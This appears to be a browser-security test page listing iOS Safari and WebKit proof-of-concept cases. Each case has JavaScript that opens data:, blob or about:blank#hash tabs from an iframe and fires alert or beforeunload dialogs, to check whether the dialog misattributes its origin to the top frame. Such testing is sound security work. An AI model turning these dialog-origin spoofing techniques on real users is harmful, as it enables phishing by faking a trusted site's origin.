i02
data:,Hello + win.alert() cross-tab
iOS ▾
Opens data:,Hello in a new Safari tab, then after 800ms the iframe calls win.alert() on that tab. On iOS, the timing needs to be longer than desktop (800ms vs 100ms) to allow Safari to finish tab initialization.
On iOS, the dialog may appear on the new tab. Switch to it if nothing shows immediately.
❌ Vulnerable
Sheet shows:
1.hackeronce.com
✅ Safe
Sheet shows:
sho3hit.github.io
var win = window.open('data:,Hello');
// 800ms — iOS Safari needs more init time
setTimeout(() => {
  win.alert('iOS02 cross-tab\\niframe: ' + window.origin);
}, 800);

i05
Blob URL — WebKit blob origin handling
WebKit ▾
Creates a Blob URL owned by the iframe's origin and opens it in a new Safari tab. WebKit's blob URL origin handling is separate from Chromium's. The blob's creator is the iframe — if the sheet shows the top frame instead, WebKit has the same bug class independently.
❌ Vulnerable
Blob tab sheet shows:
1.hackeronce.com
✅ Safe
Blob tab sheet shows:
sho3hit.github.io
const html = `<script>
alert('iOS05 Blob\\nCreator: sho3hit.github.io\\nwin.origin: '+window.origin);
</script>`;
const blob = new Blob([html], {type:'text/html'});
window.open(URL.createObjectURL(blob));
i06
about:blank#hash — WebKit safe path
WebKit ▾
Opens about:blank#fragment in Safari. Pure about:blank is a special-cased safe URL in both Chromium and WebKit. Adding a fragment (#hash) may bypass WebKit's safe path check since the URL is no longer exactly about:blank.
❌ Vulnerable
Fragment bypassed WebKit safe path — sheet shows top frame
✅ Safe
Same as about:blank — sheet shows iframe origin
var win = window.open('about:blank#ios-test');
setTimeout(() => {
  win.alert('iOS06 about:blank#hash\\niframe: ' + window.origin);
}, 800);
i07
Immediate alert — no setTimeout (iOS race)
Timing ▾
Calls win.alert() synchronously with zero delay after window.open(). iOS Safari's tab initialization is slower than desktop Chrome — the NavigationEntry may be in an even more undefined state at the point the dialog fires. This is the highest-risk timing variant on iOS.
May be blocked on iOS. Check activity log below for errors if no dialog appears.
❌ Vulnerable
Immediate dialog fires showing top frame origin
✅ Safe / Blocked
Dialog blocked, or shows iframe origin
var win = window.open('data:,Hello');
// Synchronous — no setTimeout at all
try {
  win.alert('iOS07 immediate\\niframe: ' + window.origin);
} catch(e) {
  console.log('Blocked:', e.message);
}
i08
Multi-nav in new Safari tab
Timing ▾
Opens data:,First in a new tab, then navigates to data:,Second, then triggers the dialog. On iOS Safari, back-forward cache (BFCache) is aggressively used — a second navigation may restore a cached state with stale NavigationEntry origin data.
❌ Vulnerable
After 2nd nav, dialog shows stale or top-frame origin
✅ Safe
Dialog shows iframe origin consistently after both navs
var win = window.open('data:,First');
setTimeout(() => {
  win.location.href = 'data:,Second'; // 2nd nav
  setTimeout(() => {
    win.alert('iOS08 after 2nd nav\\niframe: ' + window.origin);
  }, 800); // iOS BFCache needs more time
}, 800);

i10
beforeunload on iOS Safari
WebKit ▾
Sets onbeforeunload on the opened tab then navigates it away. iOS Safari handles beforeunload differently — it often suppresses it entirely on mobile. If it does fire, check the origin in the sheet. If it doesn't fire, that itself is logged in the activity log below.
beforeunload is often suppressed by iOS Safari — no dialog appearing is expected behavior, not a bug.
❌ Vulnerable
If sheet fires — shows top frame origin
✅ Expected
iOS suppresses beforeunload — no dialog (normal behavior)
var win = window.open('data:,Hello');
setTimeout(() => {
  win.onbeforeunload = () => 'iOS10 beforeunload — check origin';
  setTimeout(() => {
    win.location.href = 'about:blank'; // triggers beforeunload
  }, 400);
}, 800);
